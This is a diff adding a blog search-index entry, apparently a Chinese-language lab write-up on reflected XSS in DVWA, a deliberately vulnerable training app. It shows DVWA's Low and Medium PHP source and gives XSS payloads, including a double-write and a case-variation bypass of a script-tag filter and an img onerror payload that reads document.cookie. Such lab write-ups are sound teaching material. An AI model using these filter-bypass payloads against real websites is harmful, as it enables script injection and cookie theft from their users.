@@ -1246,4 +1246,43 @@
         <tag>-Web</tag>
       </tags>
   </entry>
+  <entry>
+    <title>DVWA-XSS-Reflected</title>
+    <url>/2022/05/06/DVWA-XSS-Reflected/</url>
+    <content><![CDATA[<h1 id="DVWA-XSS-Reflected"><a href="#DVWA-XSS-Reflected" class="headerlink" title="DVWA-XSS(Reflected)"></a>DVWA-XSS(Reflected)</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>反射型XXS是一种非持久性的攻击，它指的是恶意攻击者往Web页面里插入恶意代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的目的。</p>
+<hr>
+<p>参考：</p>
+<p><a href="https://segmentfault.com/a/1190000019484055">https://segmentfault.com/a/1190000019484055</a></p>
+<hr>
+<h2 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h2><p>点开源码分析</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">	<span class="comment">// Feedback for end user</span></span><br><span class="line">	<span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们会发现没有任何的过滤和检查。那我们可以直接攻击。</p>
+<ul>
+<li>构造    <script>alert(1)</script>    输入。</li>
+<li><img src="https://colson-max.github.io/2022/05/06/DVWA-XSS-Reflected/1.png" alt="1"></li>
+</ul>
+<hr>
+<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>同样我们点开源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到源码中，使用 <strong>str_replace</strong> 函数将输入的 <strong><script></strong> 删除。也就实现了 <script> 的过滤。</p>
+<ul>
+<li><p>双写绕过</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">ipt&gt;alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/./DVWA-XSS-Reflected/2.png" alt="2"></p>
+</li>
+<li><p>大小写绕过</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sCript</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>输入其他标签</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie)</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>这三种方法都可以绕过过滤，达到我们的预期效果。</p>
+</script></strong></p>]]></content>
+      <tags>
+        <tag>-DVWA</tag>
+        <tag>-XSS</tag>
+      </tags>
+  </entry>
 </search>
